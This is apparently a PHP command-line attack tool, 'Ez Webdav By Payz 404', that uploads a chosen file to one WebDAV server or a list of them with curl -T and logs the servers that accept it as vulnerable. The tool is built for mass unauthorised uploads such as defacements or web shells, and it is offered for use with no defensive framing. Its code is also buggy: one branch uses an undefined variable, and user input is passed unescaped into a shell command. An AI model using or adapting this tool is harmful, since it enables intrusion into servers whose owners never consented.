<?php

system("clear");
$banner = <<< EOD

\e[31m ________            __       __ 
/        |          /  |  _  /  |
$$$$$$$$/  ________ $$ | / \ $$ |
$$ |__    /        |$$ |/$  \$$ |
$$    |   $$$$$$$$/ $$ /$$$  $$ |
$$$$$/      /  $$/  $$ $$/$$ $$ |
\e[0m$$ |_____  /$$$$/__ $$$$/  $$$$ |
$$       |/$$      |$$$/    $$$ |
$$$$$$$$/ $$$$$$$$/ $$/      $$/ 
                                 
[+] Ez Webdav By Payz 404 [+]



EOD;
echo $banner;
echo "[1]. Single Target\n";
echo "[2]. Multi Target\n";
echo "\n[?] Choose Option: ";
$tanya = trim(fgets(STDIN));
if($tanya == "1") {

 echo "Enter Target: ";
$starget = trim(fgets(STDIN));
 echo "Enter Your File: ";
$ssc = trim(fgets(STDIN));
system("curl -T ".$ssc." ".$starget);
$handle = curl_init($site);
  curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($handle, CURLOPT_NOBODY, true);
  curl_exec($handle);
 
  $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE);
  curl_close($handle);
 
  if ($httpCode >= 200 && $httpCode < 201) {
    echo "\e[32m[+] File Uploaded To ".$site."\n\n\e[0m";
$file = fopen("result.txt", "a");
$save = fputs($file, $site."\n");
fclose($file);
  }
  else {
    echo "\e[31m[!] ".$site." Is Not Vuln!\n\n\e[0m";
  }
   





}else{

 echo "Enter Your List Target: ";
$mtarget = trim(fgets(STDIN));
 echo "Enter Your File: ";
$msc = trim(fgets(STDIN));

if(file_exists($mtarget)){

$list = explode("\n", file_get_contents($mtarget));

foreach ($list as $site){
sleep(1);
echo "\e[32m[+] Trying Curl ".$site."\n\e[0m";
sleep(1);
system("curl -T ".$msc." ".$site);

$handle = curl_init($site);
  curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($handle, CURLOPT_NOBODY, true);
  curl_exec($handle);
 
  $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE);
  curl_close($handle);
 
  if ($httpCode >= 200 && $httpCode < 201) {
    echo "\e[32m[+] File Uploaded To ".$site."\n\n\e[0m";
$file = fopen("result.txt", "a");
$save = fputs($file, $site."\n");
fclose($file);
  }
  else {
    echo "\e[31m[!] ".$site." Is Not Vuln!\n\n\e[0m";
  }



   }

 }


}



?>